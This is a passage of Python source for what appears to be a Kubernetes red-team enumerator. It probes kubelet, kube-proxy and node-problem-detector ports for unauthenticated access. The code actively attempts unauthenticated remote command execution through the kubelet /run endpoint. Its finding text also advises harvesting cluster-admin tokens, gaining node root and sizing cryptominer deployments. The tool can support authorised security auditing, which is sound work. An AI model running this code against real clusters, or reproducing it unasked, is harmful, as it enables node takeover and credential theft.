                'deployed without namespace isolation. Review data fields for '
                'plaintext credentials before scoping remediation.'
            ),
            'host': host,
            'port': port,
        })

    return findings


def check_k8s_node_and_kubelet_exposure(
    host: str, port: int = 10250, timeout: float = 10.0
) -> list:
    """
    Probe kubelet API and adjacent node-level services for unauthenticated access.

    Synthesized from Hands-On Red Team Tactics: post-exploitation pivot phase and
    container escape chains. Kubelet is the primary red team target for node
    compromise after gaining initial cluster access. With --anonymous-auth=true
    and --authorization-mode=AlwaysAllow, an attacker can enumerate every pod on
    the node, stream container metrics to profile workload timing, and execute
    arbitrary commands inside running containers — all without credentials. The
    /run endpoint maps directly to container exec: combined with a privileged
    container or hostPID namespace, this yields node root and full cluster takeover.

    Adjacent services (kube-proxy port 10249, node-problem-detector port 20257)
    expose health and topology data useful for lateral movement planning.

    Checks (port 10250, HTTPS kubelet):
      GET /pods                               -- CRITICAL KUBELET_PODS_UNAUTH
      GET /stats/summary                      -- HIGH     KUBELET_STATS_UNAUTH
      GET /metrics                            -- MEDIUM   KUBELET_METRICS_EXPOSED
      POST /run/<ns>/<pod>/<ctr>?command=id   -- CRITICAL KUBELET_RUN_UNAUTH_RCE

    Checks (port 10255, HTTP read-only kubelet):
      GET /pods                               -- HIGH     KUBELET_READONLY_PODS
      GET /spec                               -- MEDIUM   KUBELET_SPEC_EXPOSED

    Checks (adjacent node services):
      port 10249 GET /healthz                 -- INFO     KUBEPROXY_HEALTH_EXPOSED
      port 20257 GET /metrics                 -- MEDIUM   NODE_PROBLEM_DETECTOR_EXPOSED

    Returns list of {severity, title, detail, host, port}.
    """
    findings: list = []

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # ------------------------------------------------------------------ #
    # kubelet HTTPS port (default 10250)                                  #
    # ------------------------------------------------------------------ #

    pod_items: list = []

    # --- /pods ---
    try:
        req = urllib.request.Request(f'https://{host}:{port}/pods')
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as resp:
            if resp.status == 200:
                raw = resp.read().decode('utf-8', errors='replace')
                try:
                    pods_data = json.loads(raw)
                    pod_items = pods_data.get('items') or []
                except Exception:
                    pass
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'KUBELET_PODS_UNAUTH',
                    'detail': (
                        f'Unauthenticated kubelet /pods on {host}:{port} returned '
                        f'{len(pod_items)} pod record(s). --anonymous-auth=true with '
                        '--authorization-mode=AlwaysAllow violates CIS 4.2.1/4.2.2. '
                        'Full pod inventory — names, namespaces, images, env vars, '
                        'volume mounts — readable without credentials.'
                    ),
                    'host': host,
                    'port': port,
                })
    except Exception:
        pass

    # --- /stats/summary ---
    try:
        req = urllib.request.Request(f'https://{host}:{port}/stats/summary')
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as resp:
            if resp.status == 200:
                raw = resp.read().decode('utf-8', errors='replace')
                node_name = ''
                try:
                    stats = json.loads(raw)
                    node_name = (stats.get('node') or {}).get('nodeName', '')
                except Exception:
                    pass
                findings.append({
                    'severity': 'HIGH',
                    'title': 'KUBELET_STATS_UNAUTH',
                    'detail': (
                        f'Unauthenticated kubelet /stats/summary on {host}:{port} '
                        f'returned node resource summary'
                        + (f' for node {node_name!r}' if node_name else '')
                        + '. Exposes per-pod CPU/memory/network/disk utilization, '
                        'node capacity, and allocatable resources. Use to profile '
                        'workload timing and identify high-value compute targets.'
                    ),
                    'host': host,
                    'port': port,
                })
    except Exception:
        pass

    # --- /metrics ---
    try:
        req = urllib.request.Request(f'https://{host}:{port}/metrics')
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as resp:
            if resp.status == 200:
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'KUBELET_METRICS_EXPOSED',
                    'detail': (
                        f'Unauthenticated kubelet /metrics on {host}:{port} exposed. '
                        'Prometheus-format metrics include container runtime state, '
                        'garbage collection latency, volume operation counts, and '
                        'kubelet version. Version disclosure scopes CVE applicability; '
                        'workload counts aid targeting.'
                    ),
                    'host': host,
                    'port': port,
                })
    except Exception:
        pass

    # --- /run (RCE) — attempt on first eligible pod ---
    if pod_items:
        for pod in pod_items:
            ns = (pod.get('metadata') or {}).get('namespace', '')
            pod_name = (pod.get('metadata') or {}).get('name', '')
            containers = (pod.get('spec') or {}).get('containers') or []
            if not (ns and pod_name and containers):
                continue
            ctr_name = (containers[0] or {}).get('name', '')
            if not ctr_name:
                continue
            run_url = f'https://{host}:{port}/run/{ns}/{pod_name}/{ctr_name}'
            try:
                exec_req = urllib.request.Request(
                    run_url,
                    data=b'command=id',
                    method='POST',
                )
                exec_req.add_header(
                    'Content-Type', 'application/x-www-form-urlencoded'
                )
                with urllib.request.urlopen(
                    exec_req, context=ctx, timeout=timeout
                ) as exec_resp:
                    if exec_resp.status == 200:
                        output = exec_resp.read().decode(
                            'utf-8', errors='replace'
                        )[:256]
                        findings.append({
                            'severity': 'CRITICAL',
                            'title': 'KUBELET_RUN_UNAUTH_RCE',
                            'detail': (
                                f'Unauthenticated command execution via kubelet /run '
                                f'on {host}:{port} — target {ns}/{pod_name}/{ctr_name}. '
                                f'Output (truncated): {output!r}. '
                                'Combine with privileged container, hostPID, or '
                                'hostPath /var/run/secrets mount to achieve node root '
                                'and harvest cluster-admin service account tokens.'
                            ),
                            'host': host,
                            'port': port,
                        })
            except Exception:
                pass
            break  # one exec attempt is sufficient to confirm RCE

    # ------------------------------------------------------------------ #
    # kubelet read-only HTTP port 10255                                   #
    # ------------------------------------------------------------------ #

    # --- /pods ---
    try:
        req = urllib.request.Request(f'http://{host}:10255/pods')
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            if resp.status == 200:
                raw = resp.read().decode('utf-8', errors='replace')
                item_count = 0
                try:
                    item_count = len((json.loads(raw).get('items') or []))
                except Exception:
                    pass
                findings.append({
                    'severity': 'HIGH',
                    'title': 'KUBELET_READONLY_PODS',
                    'detail': (
                        f'Kubelet read-only port 10255 /pods on {host} returned '
                        f'{item_count} pod record(s) without authentication. '
                        'CIS 4.2.4 requires --read-only-port=0. Exposes pod names, '
                        'image tags, namespace layout, and service account mount '
                        'paths — pre-exploit reconnaissance without touching '
                        'the authenticated kubelet port.'
                    ),
                    'host': host,
                    'port': 10255,
                })
    except Exception:
        pass

    # --- /spec ---
    try:
        req = urllib.request.Request(f'http://{host}:10255/spec')
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            if resp.status == 200:
                raw = resp.read().decode('utf-8', errors='replace')
                cpu_count = None
                try:
                    spec = json.loads(raw)
                    cpu_count = spec.get('num_cores') or (
                        spec.get('cpu') or {}
                    ).get('num_cores')
                except Exception:
                    pass
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'KUBELET_SPEC_EXPOSED',
                    'detail': (
                        f'Kubelet read-only port 10255 /spec on {host} returned '
                        'node hardware specification without authentication'
                        + (f' ({cpu_count} CPU cores)' if cpu_count else '')
                        + '. Discloses CPU architecture, memory, disk topology, '
                        'and OS version. Scope architecture-specific exploit '
                        'payloads and size cryptominer/beacon deployments.'
                    ),
                    'host': host,
                    'port': 10255,
                })
    except Exception:
        pass

    # ------------------------------------------------------------------ #
    # kube-proxy health port 10249                                        #
    # ------------------------------------------------------------------ #
    try:
        req = urllib.request.Request(f'http://{host}:10249/healthz')
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            if resp.status == 200:
                findings.append({
                    'severity': 'INFO',
                    'title': 'KUBEPROXY_HEALTH_EXPOSED',
                    'detail': (
                        f'kube-proxy health endpoint /healthz accessible on '
                        f'{host}:10249 without authentication. Confirms kube-proxy '
                        'is running on this node and handling Service routing. '
                        'Combined with pod enumeration, maps the full network '
                        'forwarding topology for lateral movement planning.'
                    ),
                    'host': host,
                    'port': 10249,
                })
    except Exception:
        pass

    # ------------------------------------------------------------------ #
    # node-problem-detector port 20257                                    #
    # ------------------------------------------------------------------ #
    try:
        req = urllib.request.Request(f'http://{host}:20257/metrics')
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            if resp.status == 200:
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'NODE_PROBLEM_DETECTOR_EXPOSED',
                    'detail': (
                        f'node-problem-detector metrics endpoint accessible on '
                        f'{host}:20257 without authentication. Exposes node health '
                        'conditions — kernel oops, OOM events, disk pressure, '
                        'network unavailability — with timestamps. Historical '
                        'problem data identifies degraded nodes worth targeting '
                        'and reveals monitoring blind spots in the operator stack.'
                    ),
                    'host': host,
                    'port': 20257,
                })
    except Exception:
        pass

    return findings


if __name__ == '__main__':
    enum = K8sEnumerator()
    result = enum.enumerate_all()
    print(enum.report())
    # Also dump structured JSON for machine consumption
    import sys
    if '--json' in sys.argv:
        print(json.dumps(result, indent=2, default=str))
